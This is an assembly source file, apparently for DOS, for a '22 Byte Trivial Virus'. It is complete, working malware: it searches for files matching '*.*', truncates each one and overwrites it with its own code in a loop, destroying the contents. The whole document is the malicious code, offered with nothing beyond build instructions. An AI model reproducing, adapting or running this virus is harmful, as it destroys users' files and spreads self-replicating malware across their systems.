;22 Byte Trivial Virus
;Use WASM to assemble

		org	100h

		db '*.*',0

		mov ah,4eh
Again
		mov	dx,si
		int	21h
		mov	ah,3ch
		mov	dx,9eh
		int	21h
		xchg	bx,ax
		mov	ah,40h
		jmps	Again
